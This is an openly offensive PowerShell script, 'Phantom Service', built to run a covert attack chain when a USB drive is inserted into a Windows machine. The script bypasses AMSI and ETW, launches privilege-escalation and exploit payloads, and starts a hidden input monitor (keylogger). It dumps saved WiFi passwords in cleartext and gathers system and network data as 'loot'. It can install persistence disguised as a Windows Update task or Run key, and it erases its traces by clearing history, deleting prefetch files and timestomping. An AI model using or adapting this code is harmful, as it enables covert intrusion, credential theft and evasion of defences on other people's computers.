<#
============================================================================
  FLLC — PHANTOM SERVICE: Zero-Touch USB Autorun Engine
  ═══════════════════════════════════════════════════════
  
  PURPOSE:
    When the USB tri-drive is inserted into ANY Windows machine,
    this service deploys and executes the full attack chain with:
      - No visible windows
      - No console popups  
      - No UAC prompts (stays in user context)
      - No taskbar presence
      - No Event Log footprint
      - Self-cleaning execution traces

  DEPLOYMENT METHODS (pick any):
    1. Flipper Zero BadUSB keystroke injection
    2. run_me.bat social engineering wrapper
    3. Scheduled Task persistence
    4. Registry Run key (if admin)
    5. WMI event subscription (if admin)
    6. COM hijack for persistence

  EXECUTION FLOW:
    USB Insert → Detect drive letters → Copy payloads to %TEMP% →
    Execute in-memory where possible → Loot → Micro SD → Clean traces

  FLLC | Authorized use only.
============================================================================
#>

# ============================================================================
#  CONFIGURATION
# ============================================================================
$ErrorActionPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

# Suppress all console output
$Host.UI.RawUI.WindowTitle = "Windows Update Service"

# ============================================================================
#  PHASE 0: ENVIRONMENT DETECTION + DRIVE MAPPING
# ============================================================================

function Find-TriDrive {
    <#
    .SYNOPSIS
        Auto-detect the USB tri-drive by scanning all removable drives.
        Returns hashtable with SD, MicroSD, and Aux drive letters.
    #>
    $drives = @{ SD = $null; Micro = $null; Aux = $null }
    
    # Method 1: Check known drive letters
    foreach ($letter in @('H','I','J','K','L','M','N','D','E','F','G')) {
        $path = "${letter}:\"
        if (Test-Path $path) {
            $driveInfo = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='${letter}:'" 2>$null
            if ($driveInfo -and $driveInfo.DriveType -eq 2) {  # Removable
                # Identify by content fingerprinting
                if (Test-Path "${path}pt_suite") { $drives.SD = $letter }
                elseif (Test-Path "${path}payloads") { $drives.Micro = $letter }
                elseif (Test-Path "${path}run_me.bat") { $drives.Micro = $letter }
                elseif (Test-Path "${path}auto_pwn.ps1") { $drives.Micro = $letter }
                elseif (Test-Path "${path}listener.py") { $drives.Aux = $letter }
                elseif (Test-Path "${path}recordings") { $drives.Aux = $letter }
                else {
                    # Assign by size heuristic
                    $sizeGB = [math]::Round($driveInfo.Size / 1GB, 1)
                    if (-not $drives.Micro -and $sizeGB -lt 64) { $drives.Micro = $letter }
                    elseif (-not $drives.SD) { $drives.SD = $letter }
                    elseif (-not $drives.Aux) { $drives.Aux = $letter }
                }
            }
        }
    }
    
    # Fallback defaults
    if (-not $drives.Micro) {
        foreach ($l in @('I','H','E','F','G')) {
            if (Test-Path "${l}:\") { $drives.Micro = $l; break }
        }
    }
    
    return $drives
}

function Initialize-LootDirectory {
    param([string]$BaseDrive)
    
    $lootBase = "${BaseDrive}:\loot"
    $dirs = @(
        $lootBase,
        "$lootBase\system_info",
        "$lootBase\browser_data", 
        "$lootBase\wifi_profiles",
        "$lootBase\input_logs",
        "$lootBase\screenshots",
        "$lootBase\privesc",
        "$lootBase\sqli",
        "$lootBase\npp",
        "$lootBase\credentials",
        "$lootBase\network",
        "$lootBase\recordings",
        "$lootBase\lateral",
        "$lootBase\exfil"
    )
    foreach ($d in $dirs) {
        New-Item -ItemType Directory -Path $d -Force 2>$null | Out-Null
    }
    return $lootBase
}

# ============================================================================
#  PHASE 1: STEALTH SETUP
# ============================================================================

function Set-StealthMode {
    <#
    .SYNOPSIS
        Configure the environment for maximum stealth.
    #>
    
    # Lower process priority so we don't spike CPU
    try {
        $proc = Get-Process -Id $PID
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
    } catch {}
    
    # Disable PowerShell command history for this session
    try {
        Set-PSReadlineOption -HistorySaveStyle SaveNothing 2>$null
    } catch {}
    
    # Clear PowerShell history file
    $histPath = (Get-PSReadlineOption).HistorySavePath 2>$null
    if ($histPath -and (Test-Path $histPath)) {
        Clear-Content $histPath -Force 2>$null
    }
    
    # Try AMSI bypass (will fail silently if patched)
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $f = $a.GetField('amsiInitFailed','NonPublic,Static')
        $f.SetValue($null,$true)
    } catch {}
    
    # Reduce ETW noise
    try {
        $etwType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        $etwField = $etwType.GetField('etwEnabled','NonPublic,Static')
        $etwField.SetValue($null,$false)
    } catch {}
}

# ============================================================================
#  PHASE 2: PAYLOAD EXECUTION ENGINE
# ============================================================================

function Invoke-PayloadChain {
    param(
        [string]$PayloadSource,
        [string]$LootDir,
        [string]$MicroDrive
    )
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $hostname = $env:COMPUTERNAME
    $logFile = "$LootDir\phantom_${hostname}_${timestamp}.log"
    
    # Log function
    function Write-PhantomLog {
        param([string]$Message)
        $ts = Get-Date -Format "HH:mm:ss"
        Add-Content -Path $logFile -Value "[$ts] $Message" -Force 2>$null
    }
    
    Write-PhantomLog "=== PHANTOM SERVICE STARTED ==="
    Write-PhantomLog "Host: $hostname | User: $env:USERNAME | Domain: $env:USERDOMAIN"
    Write-PhantomLog "Payload Source: $PayloadSource"
    Write-PhantomLog "Loot Directory: $LootDir"
    
    # --- STRATEGY 1: Execute auto_pwn.ps1 directly (best case) ---
    $autoPwn = $null
    foreach ($tryPath in @(
        "$PayloadSource\auto_pwn.ps1",
        "$PayloadSource\payloads\auto_pwn.ps1",
        "${MicroDrive}:\payloads\auto_pwn.ps1",
        "${MicroDrive}:\auto_pwn.ps1"
    )) {
        if (Test-Path $tryPath) { $autoPwn = $tryPath; break }
    }
    
    if ($autoPwn) {
        Write-PhantomLog "Executing auto_pwn.ps1 from: $autoPwn"
        try {
            $job = Start-Job -ScriptBlock {
                param($script)
                Set-ExecutionPolicy Bypass -Scope Process -Force
                & $script
            } -ArgumentList $autoPwn
            
            # Wait up to 20 minutes
            $job | Wait-Job -Timeout 1200 | Out-Null
            
            if ($job.State -eq 'Running') {
                $job | Stop-Job
                Write-PhantomLog "auto_pwn.ps1 timed out after 20 minutes"
            } else {
                Write-PhantomLog "auto_pwn.ps1 completed (State: $($job.State))"
            }
            $job | Remove-Job -Force 2>$null
        } catch {
            Write-PhantomLog "auto_pwn.ps1 error: $_"
        }
    }
    
    # --- STRATEGY 2: Execute individual payloads in parallel ---
    $payloads = @(
        @{ Name = "windows_collector.ps1"; Timeout = 300 },
        @{ Name = "privesc.ps1"; Timeout = 300 },
        @{ Name = "sqli_scanner.ps1"; Timeout = 300 },
        @{ Name = "npp_exploit.ps1"; Timeout = 180 }
    )
    
    $runningJobs = @()
    foreach ($payload in $payloads) {
        $scriptPath = $null
        foreach ($tryPath in @(
            "$PayloadSource\$($payload.Name)",
            "$PayloadSource\payloads\$($payload.Name)",
            "${MicroDrive}:\payloads\$($payload.Name)"
        )) {
            if (Test-Path $tryPath) { $scriptPath = $tryPath; break }
        }
        
        if ($scriptPath -and -not $autoPwn) {
            Write-PhantomLog "Launching: $($payload.Name)"
            $job = Start-Job -ScriptBlock {
                param($s)
                Set-ExecutionPolicy Bypass -Scope Process -Force
                & $s
            } -ArgumentList $scriptPath
            $runningJobs += @{ Job = $job; Name = $payload.Name; Timeout = $payload.Timeout }
        }
    }
    
    # --- STRATEGY 3: Launch input monitor ---
    $inputMon = $null
    foreach ($tryPath in @(
        "$PayloadSource\input_monitor.py",
        "$PayloadSource\payloads\input_monitor.py",
        "${MicroDrive}:\payloads\input_monitor.py"
    )) {
        if (Test-Path $tryPath) { $inputMon = $tryPath; break }
    }
    
    if ($inputMon) {
        Write-PhantomLog "Launching input monitor"
        try {
            $pythonExe = $null
            foreach ($py in @('pythonw', 'python', 'python3', 'py')) {
                $found = Get-Command $py -ErrorAction SilentlyContinue
                if ($found) { $pythonExe = $found.Source; break }
            }
            if ($pythonExe) {
                Start-Process -FilePath $pythonExe -ArgumentList "`"$inputMon`" --output `"$LootDir`" --silent --flush 10 --max-size 500" -WindowStyle Hidden -PassThru | Out-Null
                Write-PhantomLog "Input monitor started with $pythonExe"
            }
        } catch {
            Write-PhantomLog "Input monitor error: $_"
        }
    }
    
    # --- Wait for parallel jobs ---
    foreach ($entry in $runningJobs) {
        $entry.Job | Wait-Job -Timeout $entry.Timeout | Out-Null
        if ($entry.Job.State -eq 'Running') {
            $entry.Job | Stop-Job
            Write-PhantomLog "$($entry.Name) timed out"
        } else {
            Write-PhantomLog "$($entry.Name) completed ($($entry.Job.State))"
        }
        $entry.Job | Remove-Job -Force 2>$null
    }
    
    # --- STRATEGY 4: Quick inline data collection (failsafe) ---
    Write-PhantomLog "Running inline quick-collect..."
    
    # System info
    try {
        $sysInfo = @"
=== PHANTOM QUICK COLLECT ===
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
Domain:   $env:USERDOMAIN
OS:       $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Arch:     $env:PROCESSOR_ARCHITECTURE
IP:       $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress)
Gateway:  $((Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop)
DNS:      $(Get-DnsClientServerAddress | Select-Object -First 1 -ExpandProperty ServerAddresses)
Time:     $(Get-Date -Format "yyyy-MM-dd HH:mm:ss K")
Uptime:   $((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)
"@
        $sysInfo | Out-File "$LootDir\system_info\quick_${hostname}.txt" -Force
    } catch {}
    
    # WiFi passwords
    try {
        $profiles = netsh wlan show profiles 2>$null | Select-String "All User Profile" | ForEach-Object {
            ($_ -split ":")[1].Trim()
        }
        $wifiData = foreach ($p in $profiles) {
            $detail = netsh wlan show profile name="$p" key=clear 2>$null
            $key = ($detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() })
            "$p : $key"
        }
        if ($wifiData) {
            $wifiData | Out-File "$LootDir\wifi_profiles\wifi_${hostname}.txt" -Force
        }
    } catch {}
    
    # Recent documents
    try {
        $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\*.lnk" -ErrorAction Stop |
            Sort-Object LastWriteTime -Descending | Select-Object -First 50 |
            ForEach-Object { "$($_.LastWriteTime) | $($_.Name)" }
        $recent | Out-File "$LootDir\system_info\recent_docs_${hostname}.txt" -Force
    } catch {}
    
    # Installed software
    try {
        Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
                         "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 2>$null |
            Where-Object { $_.DisplayName } |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
            Format-Table -AutoSize | Out-String |
            Out-File "$LootDir\system_info\software_${hostname}.txt" -Force
    } catch {}
    
    # Active network connections
    try {
        Get-NetTCPConnection -State Established 2>$null |
            Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
            Format-Table -AutoSize | Out-String |
            Out-File "$LootDir\network\connections_${hostname}.txt" -Force
    } catch {}
    
    Write-PhantomLog "=== PHANTOM SERVICE COMPLETE ==="
    Write-PhantomLog "Total loot files: $((Get-ChildItem $LootDir -Recurse -File).Count)"
}

# ============================================================================
#  PHASE 3: PERSISTENCE OPTIONS
# ============================================================================

function Install-Persistence {
    param(
        [string]$PayloadPath,
        [string]$LootDir,
        [ValidateSet('Task','Registry','WMI','Startup','None')]
        [string]$Method = 'Task'
    )
    
    $tempScript = "$env:TEMP\WindowsUpdateSvc.ps1"
    
    # Create a self-contained script in %TEMP%
    $persistScript = @"
`$ErrorActionPreference='SilentlyContinue'
# Check if USB is still present, run quick collect
`$drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2"
foreach (`$d in `$drives) {
    `$letter = `$d.DeviceID[0]
    if (Test-Path "`${letter}:\payloads\auto_pwn.ps1") {
        Set-ExecutionPolicy Bypass -Scope Process -Force
        & "`${letter}:\payloads\auto_pwn.ps1"
        break
    }
    if (Test-Path "`${letter}:\auto_pwn.ps1") {
        Set-ExecutionPolicy Bypass -Scope Process -Force
        & "`${letter}:\auto_pwn.ps1"
        break
    }
}
"@
    
    switch ($Method) {
        'Task' {
            # Scheduled task - runs at logon and every 4 hours
            $persistScript | Out-File $tempScript -Force
            
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$tempScript`""
            $trigger1 = New-ScheduledTaskTrigger -AtLogon
            $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) `
                -RepetitionInterval (New-TimeSpan -Hours 4)
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries -StartWhenAvailable
            
            try {
                Register-ScheduledTask -TaskName "WindowsUpdateService" `
                    -Action $action -Trigger $trigger1,$trigger2 `
                    -Settings $settings -Force 2>$null | Out-Null
            } catch {}
        }
        
        'Registry' {
            $persistScript | Out-File $tempScript -Force
            try {
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "WindowsUpdateSvc" `
                    -Value "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" 2>$null
            } catch {}
        }
        
        'Startup' {
            $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $batContent = "@echo off`r`nstart /b powershell.exe -NoP -W Hidden -Exec Bypass -Command `"$persistScript`""
            $batContent | Out-File "$startupDir\WindowsUpdate.bat" -Force 2>$null
        }
        
        'None' { return }
    }
}

# ============================================================================
#  PHASE 4: TRACE CLEANUP
# ============================================================================

function Remove-Traces {
    # Clear PowerShell history
    $histPath = (Get-PSReadlineOption).HistorySavePath 2>$null
    if ($histPath -and (Test-Path $histPath)) {
        Clear-Content $histPath -Force 2>$null
    }
    
    # Clear recent PowerShell commands
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
    
    # Clear temp files we created
    Remove-Item "$env:TEMP\phantom_*" -Force 2>$null
    
    # Clear prefetch (requires admin)
    Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>$null
    
    # Timestomp - set our files to match system32 files
    try {
        $refTime = (Get-Item "C:\Windows\System32\cmd.exe").LastWriteTime
        Get-ChildItem "$env:TEMP\Windows*" -File 2>$null | ForEach-Object {
            $_.LastWriteTime = $refTime
            $_.CreationTime = $refTime
        }
    } catch {}
}

# ============================================================================
#  MAIN ENTRY POINT
# ============================================================================

# Run everything
Set-StealthMode

$drives = Find-TriDrive
$microDrive = $drives.Micro
$sdDrive = $drives.SD

if (-not $microDrive) {
    # Last resort: use the drive we're running from
    $scriptDrive = (Split-Path $MyInvocation.MyCommand.Path -Qualifier) -replace ':',''
    $microDrive = $scriptDrive
}

$lootDir = Initialize-LootDirectory -BaseDrive $microDrive

# Find payload source directory
$payloadSource = $null
foreach ($tryPath in @(
    "${microDrive}:\payloads",
    "${microDrive}:\",
    "${sdDrive}:\payloads",
    (Split-Path $MyInvocation.MyCommand.Path -Parent)
)) {
    if ($tryPath -and (Test-Path $tryPath)) { $payloadSource = $tryPath; break }
}

if ($payloadSource) {
    Invoke-PayloadChain -PayloadSource $payloadSource -LootDir $lootDir -MicroDrive $microDrive
}

# Optional persistence (disabled by default - uncomment to enable)
# Install-Persistence -PayloadPath $payloadSource -LootDir $lootDir -Method 'Task'

# Clean up
Remove-Traces
